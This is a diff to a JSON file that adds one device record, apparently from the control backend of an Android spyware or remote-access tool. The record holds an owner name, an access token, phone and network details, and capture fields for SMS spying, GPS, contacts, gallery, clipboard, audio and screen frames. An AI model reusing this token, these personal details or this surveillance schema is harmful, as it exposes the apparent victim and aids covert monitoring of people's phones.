@@ -6343,5 +6343,37 @@
       "frameId": 5,
       "capturedAt": 1776038453257
     }
+  },
+  {
+    "deviceId": "pxc_a91234f3",
+    "deviceName": "HP-DDD-1CAC",
+    "ownerUsername": "kamu cii",
+    "token": "d5a9c3629e069dc89393e6c813957bc7",
+    "lastSeen": 1776041365859,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-13T00:49:25.859Z",
+    "deviceInfo": {
+      "model": "Xiaomi 21121119SG",
+      "androidVersion": "Android 11",
+      "battery": 90,
+      "network": "WiFi: Bandit",
+      "sim1": "Smartfren 100% untuk Indonesia — smartfren",
+      "sim2": "Tidak ada layanan"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
